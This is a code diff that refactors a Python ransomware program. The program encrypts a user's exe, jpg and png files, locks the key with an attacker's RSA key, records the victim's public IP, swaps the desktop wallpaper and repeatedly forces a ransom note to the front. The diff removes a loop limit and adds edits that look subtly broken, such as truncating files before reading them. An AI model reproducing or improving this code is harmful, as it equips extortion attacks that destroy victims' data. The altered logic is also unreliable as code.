@@ -17,34 +17,17 @@ from cryptography.fernet import Fernet  # encrypt/decrypt files on target system
 
 class RansomWare:
     # File exstensions to seek out and Encrypt
-    arg = sys.argv[1]  # TODO argparse for command line arguments
-    if arg == "exe":
-        file_exts = [
-            "exe",
-        ]
-    elif arg == "jpg":
-        file_exts = [
-            "jpg",
-        ]
-    elif arg == "png":
-        file_exts = [
-            "png",
-        ]
-    else:
-        file_exts = [
-            "exe",
-            "jpg",
-            "png",
-        ]
+    valid_exts = ["exe", "jpg", "png"]  # TODO argparse for command line arguments
+    file_exts = [arg] if (arg := sys.argv[1]) in valid_exts else valid_exts
     print(file_exts)
 
     def __init__(self):
         # Key that will be used for Fernet object and encrypt/decrypt method
-        self.key = None
+        self.key = Fernet.generate_key()
         # Encrypt/Decrypter
-        self.crypter = None
+        self.crypter = Fernet(self.key)
         # RSA public key used for encrypting/decrypting fernet object eg, Symmetric key
-        self.public_key = None
+        self.public_key = RSA.import_key(open("public.pem").read())
         # Use sysroot to create absolute path for files, etc. And for encrypting whole system
         self.sysRoot = os.path.expanduser("~")
         # Use localroot to test encryption softawre and for absolute path for files and encryption of "test system"
@@ -53,13 +36,6 @@ class RansomWare:
 
         # Get public IP of person, for more analysis etc. (Check if you have hit gov, military ip space LOL)
         self.publicIP = requests.get("https://api.ipify.org").text
-
-    # Generates [SYMMETRIC KEY] on victim machine which is used to encrypt the victims data
-    def generate_key(self):
-        # Generates a url safe(base64 encoded) key
-        self.key = Fernet.generate_key()
-        # Creates a Fernet object with encrypt/decrypt methods
-        self.crypter = Fernet(self.key)
 
     # Write the fernet(symmetric key) to text file
     def write_key(self):
@@ -70,20 +46,20 @@ class RansomWare:
     # -RSA key that was created on OUR MACHINE. We will later be able to DECRYPT the SYSMETRIC KEY used for-
     # -Encrypt/Decrypt of files on target machine with our PRIVATE KEY, so that they can then Decrypt files etc.
     def encrypt_fernet_key(self):
-        with open("fernet_key.txt", "rb") as fk:
-            fernet_key = fk.read()
-        with open("fernet_key.txt", "wb") as f:
-            # Public RSA key
-            self.public_key = RSA.import_key(open("public.pem").read())
+        with (
+            open("fernet_key.txt", "rb") as rfk,
+            open("fernet_key.txt", "wb") as wfk,
+            open(f"{self.sysRoot}\Desktop\EMAIL_ME.txt", "wb") as wfk_desktop,
+        ):
+            fernet_key = rfk.read()
             # Public encrypter object
             public_crypter = PKCS1_OAEP.new(self.public_key)
             # Encrypted fernet key
             enc_fernent_key = public_crypter.encrypt(fernet_key)
             # Write encrypted fernet key to file
-            f.write(enc_fernent_key)
-        # Write encrypted fernet key to dekstop as well so they can send this file to be unencrypted and get system/files back
-        with open(f"{self.sysRoot}\Desktop\EMAIL_ME.txt", "wb") as fa:
-            fa.write(enc_fernent_key)
+            wfk.write(enc_fernent_key)
+            # Write encrypted fernet key to dekstop as well so they can send this file to be unencrypted and get system/files back
+            wfk_desktop.write(enc_fernent_key)
         # Assign self.key to encrypted fernet key
         self.key = enc_fernent_key
         # Remove fernet crypter object
@@ -91,9 +67,9 @@ class RansomWare:
 
     # [SYMMETRIC KEY] Fernet Encrypt/Decrypt file - file_path:str:absolute file path eg, C:/Folder/Folder/Folder/Filename.txt
     def crypt_file(self, file_path, encrypted=False):
-        with open(file_path, "rb") as f:
+        with open(file_path, "rb") as rf, open(file_path, "wb") as wf:
             # Read data from file
-            data = f.read()
+            data = rf.read()
             if not encrypted:
                 # Print file contents - [debugging]
                 print(data)
@@ -108,33 +84,31 @@ class RansomWare:
                 # Log file decrypted and print decrypted contents - [debugging]
                 print("> File decrpyted")
                 print(_data)
-        with open(file_path, "wb") as fp:
             # Write encrypted/decrypted data to file using same filename to overwrite original file
-            fp.write(_data)
+            wf.write(_data)
 
     # [SYMMETRIC KEY] Fernet Encrypt/Decrypt files on system using the symmetric key that was generated on victim machine
     def crypt_system(self, encrypted=False):
-        system = os.walk(self.localRoot, topdown=True)
-        for root, dir, files in system:
-            for file in files:
-                file_path = os.path.join(root, file)
-                if not file.split(".")[-1] in self.file_exts:
+        for root, _, files in os.walk(self.localRoot, topdown=True):
+            for file_path in (os.path.join(root, f) for f in files):
+                _, file_ext = os.path.splitext(file_path)
+
+                if file_ext not in self.file_exts:
                     continue
-                if not encrypted:
-                    self.crypt_file(file_path)
-                else:
-                    self.crypt_file(file_path, encrypted=True)
+
+                self.crypt_file(file_path, encrypted=True) if encrypted else self.crypt_file(file_path)
 
     @staticmethod
     def what_is_dogecoin():
-        url = "https://dogecoin.com/"
-        # Open browser to the https://bitcoin.org so they know what bitcoin is
-        webbrowser.open(url)
+        """Open browser to the https://bitcoin.org so they know what bitcoin is"""
+        webbrowser.open("https://dogecoin.com/")
 
     def change_desktop_background(self):
+        """Go to specif url and download+save image using absolute path"""
+
         imageUrl = "https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Fi.imgur.com%2FGnqMTPa.png&f=1&nofb=1"
-        # Go to specif url and download+save image using absolute path
         path = f"{self.sysRoot}\Desktop\Background.jpg"
+
         urllib.request.urlretrieve(imageUrl, path)
         SPI_SETDESKWALLPAPER = 20
         # Access windows dlls for funcionality eg, changing dekstop wallpaper
@@ -168,28 +142,22 @@ To purchase your key and restore your data, please follow these three easy steps
             )
 
     def show_ransom_note(self):
-        # Open the ransom note
+        """Displays the ransome note to the victim."""
+
         ransom = subprocess.Popen(["notepad.exe", "RANSOM_NOTE.txt"])
-        count = 0  # Debugging/Testing
-        while True:
+
+        while win32gui.GetWindowText(win32gui.GetForegroundWindow()) != "RANSOM_NOTE - Notepad":
             time.sleep(0.1)
-            top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
-            if top_window == "RANSOM_NOTE - Notepad":
-                print("Ransom note is the top window - do nothing")  # Debugging/Testing
-                pass
-            else:
-                print("Ransom note is not the top window - kill/create process again")  # Debugging/Testing
-                # Kill ransom note so we can open it agian and make sure ransom note is in ForeGround (top of all windows)
-                time.sleep(0.1)
-                ransom.kill()
-                # Open the ransom note
-                time.sleep(0.1)
-                ransom = subprocess.Popen(["notepad.exe", "RANSOM_NOTE.txt"])
+            print("Ransom note is not the top window - kill/create process again")  # Debugging/Testing
+            # Kill ransom note so we can open it agian and make sure ransom note is in ForeGround (top of all windows)
+            time.sleep(0.1)
+            ransom.kill()
+            # Open the ransom note
+            time.sleep(0.1)
+            ransom = subprocess.Popen(["notepad.exe", "RANSOM_NOTE.txt"])
+
             # sleep for 10 seconds
             time.sleep(30)
-            count += 1
-            if count == 5:
-                break
 
     # Decrypts system when text file with un-encrypted key in it is placed on dekstop of target machine
     def put_me_on_desktop(self):
@@ -211,7 +179,6 @@ To purchase your key and restore your data, please follow these three easy steps
                     break
             except Exception as e:
                 print(e)  # Debugging/Testing
-                pass
             time.sleep(5)
             # Sleep ~ 3 mins
             # secs = 60
@@ -221,7 +188,6 @@ To purchase your key and restore your data, please follow these three easy steps
 
 def main():
     rw = RansomWare()
-    rw.generate_key()
     rw.crypt_system()
     rw.write_key()
     rw.encrypt_fernet_key()
@@ -234,7 +200,9 @@ def main():
 
     t1.start()
     print("> RansomWare: Attack completed on target machine and system is encrypted")  # Debugging/Testing
-    print("> RansomWare: Waiting for attacker to give target machine document that will un-encrypt machine")  # Debugging/Testing
+    print(
+        "> RansomWare: Waiting for attacker to give target machine document that will un-encrypt machine"
+    )  # Debugging/Testing
     t2.start()
     print("> RansomWare: Completed")  # Debugging/Testing
 
